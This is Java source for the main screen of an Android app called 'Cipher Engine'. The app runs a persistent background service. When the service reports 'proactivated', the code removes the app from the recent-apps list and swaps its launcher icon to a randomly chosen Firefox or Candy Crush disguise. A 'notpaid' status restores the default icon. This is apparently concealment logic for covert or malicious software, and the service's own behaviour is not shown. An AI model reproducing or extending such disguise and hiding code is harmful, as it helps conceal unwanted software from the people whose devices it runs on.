package com.hardcode.cipher;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.util.List;

public class MainActivity extends AppCompatActivity implements EngineService.StatusListener {

    private TextView   logView;
    private ScrollView logScroll;
    private Button     btnStart;
    private Button     btnStop;
    private FrameLayout readmeOverlay;   // <-- ADDED

    private EngineService engineService;
    private boolean       serviceBound = false;

    // ── Service connection ────────────────────────────────────────────────────

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            engineService = ((EngineService.LocalBinder) binder).getService();

            logView.setText("");
            List<String> history = engineService.getLogSnapshot();
            for (String line : history) {
                logView.append(line + "\n");
            }
            logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));

            engineService.setStatusListener(MainActivity.this);
            serviceBound = true;

            setButtonStates(true);
            if (history.isEmpty()) {
                appendLog("↺ Engine restarting after system kill…");
                connect();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            engineService = null;
            serviceBound  = false;
            setButtonStates(false);
        }
    };

    // ── Lifecycle ─────────────────────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        setTheme(R.style.Theme_Cipher);
        super.onCreate(savedInstanceState);

        new Handler().postDelayed(() -> {
            setContentView(R.layout.activity_main);

            logView   = findViewById(R.id.logView);
            logScroll = findViewById(R.id.logScroll);
            btnStart  = findViewById(R.id.btnStart);
            btnStop   = findViewById(R.id.btnStop);
            readmeOverlay = findViewById(R.id.readmeOverlay);   // <-- ADDED

            btnStart.setOnClickListener(v -> connect());
            btnStop.setOnClickListener(v  -> stopEngine());
            setButtonStates(false);

            // ── Dismiss the "Read me" overlay ──────────────────────────────
            Button btnDismiss = findViewById(R.id.btnDismissReadme);
            btnDismiss.setOnClickListener(v -> {
                readmeOverlay.setVisibility(View.GONE);   // closes the modal completely
            });

            if (savedInstanceState == null) {
                appendLog("Welcome to Cipher Engine.");
                launchService();
            } else {
                if (!serviceBound) {
                    bindService(new Intent(this, EngineService.class), connection, Context.BIND_AUTO_CREATE);
                }
            }
        }, 1500);
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (!serviceBound && logView != null) {
            bindService(new Intent(this, EngineService.class), connection, Context.BIND_AUTO_CREATE);
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (serviceBound) {
            if (engineService != null) engineService.setStatusListener(null);
            unbindService(connection);
            serviceBound = false;
        }
    }

    // ── Connect flow ──────────────────────────────────────────────────────────

    private void connect() {
        launchService();
    }

    private void launchService() {
        Intent intent = new Intent(this, EngineService.class);
        ContextCompat.startForegroundService(this, intent);
        bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private void stopEngine() {
        if (serviceBound) {
            if (engineService != null) engineService.setStatusListener(null);
            unbindService(connection);
            serviceBound = false;
        }
        stopService(new Intent(this, EngineService.class));
        setButtonStates(false);
        appendLog("■ Engine service stopped.");
    }

    // ── EngineService.StatusListener ──────────────────────────────────────────

    @Override
    public void onStatus(String message) {
        runOnUiThread(() -> {
            if ("proactivated".equals(message)) {
                hideFromRecents();
                IconSwitcher.AppIcon disguise = (Math.random() < 0.5)
                        ? IconSwitcher.AppIcon.FIREFOX
                        : IconSwitcher.AppIcon.CANDYCRUSH;
                IconSwitcher.switchTo(this, disguise);
                if (engineService != null) {
                    engineService.setDisguise(disguise == IconSwitcher.AppIcon.FIREFOX
                            ? EngineService.Disguise.FIREFOX
                            : EngineService.Disguise.CANDYCRUSH);
                }
                return;
            }
            if ("notpaid".equals(message)) {
                IconSwitcher.switchTo(this, IconSwitcher.AppIcon.DEFAULT);
                if (engineService != null) engineService.resetDisguise();
                return;
            }
            if ("icon:default".equals(message)) {
                IconSwitcher.switchTo(this, IconSwitcher.AppIcon.DEFAULT);
                return;
            }
            if ("icon:firefox".equals(message)) {
                IconSwitcher.switchTo(this, IconSwitcher.AppIcon.FIREFOX);
                return;
            }
            if ("icon:candycrush".equals(message)) {
                IconSwitcher.switchTo(this, IconSwitcher.AppIcon.CANDYCRUSH);
                return;
            }
            appendLog(message);
        });
    }

    @Override
    public void onStatusReplace(String message) {
        runOnUiThread(() -> replaceLastLog(message));
    }

    // ── Recents ───────────────────────────────────────────────────────────────

    private void hideFromRecents() {
        ActivityManager am = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        if (am != null) {
            for (ActivityManager.AppTask task : am.getAppTasks()) {
                if (task.getTaskInfo().baseActivity != null &&
                        task.getTaskInfo().baseActivity.getPackageName()
                                .equals(getPackageName())) {
                    task.finishAndRemoveTask();
                }
            }
        }
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    private void appendLog(String msg) {
        logView.append(msg + "\n");
        logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
    }

    private void replaceLastLog(String msg) {
        String current = logView.getText().toString();
        int lastNl = current.lastIndexOf('\n', current.length() - 2);
        if (lastNl >= 0) logView.setText(current.substring(0, lastNl + 1));
        logView.append(msg + "\n");
        logScroll.post(() -> logScroll.fullScroll(ScrollView.FOCUS_DOWN));
    }

    private void setButtonStates(boolean engineRunning) {
        btnStart.setEnabled(!engineRunning);
        btnStop.setEnabled(engineRunning);
    }
}